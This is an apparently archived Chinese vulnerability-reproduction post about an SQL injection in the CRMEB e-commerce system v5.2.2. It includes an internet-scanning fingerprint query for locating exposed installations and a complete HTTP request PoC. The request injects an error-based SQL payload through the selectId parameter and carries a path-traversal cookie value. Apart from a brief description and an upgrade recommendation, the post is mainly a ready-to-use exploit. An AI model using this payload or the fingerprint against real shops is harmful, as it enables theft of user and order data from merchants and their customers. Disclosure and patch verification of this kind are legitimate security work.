---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  CRMEB开源电商系统SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-30 01:36  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
CRMEB开源电商系统SQL注入漏洞  
  
02  
  
—  
  
影响版本  
  
CRMEB v5.2.2版本  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR3n6kVFiciamgIlBrLAX8nibusqdPqazRVbyOnZY7RibrZfJia4lHdmH94LA/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOHJiaPmELuHYPfCHgM308zZYsdRqhJOMrG4SCgMxibX5h14xETWictrwTg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
CRMEB是一款基于ThinkPHP框架开发的开源电商系统，专为中小企业和个人商家设计，提供完整的B2C电商解决方案。系统采用前后端分离架构，支持多端适配，集成了商品管理、订单处理、会员体系、营销工具、支付对接、数据统计等核心功能，并内置  
多商  
户  
SA  
AS模式扩展能  
力。其代码开源免费，遵循Apache2.0协议，注重高性能与安全性  
，  
支持  
二次开发，配套丰富的API接口和详细文档，帮助用户快速搭建个性化电商平台，降低运营成本  
。  
攻击者可通过构造恶意请求，利用该漏洞获取数据库中的敏感信息，如用户数据、订单信息等，甚至  
可能进一步获取服务器控制权限。  
  
  
04  
  
—  
  
资产测绘  
```
body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR9q0F5MZLKbx4ibZK2nf0eus7V3JjjgibrB9APnFJiay7iaibQgDz0H1iaficA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaR1h3gUmblAyiaaGJGEic6KQtU8LbxQgy0qZ9XUZLDEMcaibUibz1NQtiaRSw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
  
升级至CRMEB v5.3.0及以上版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
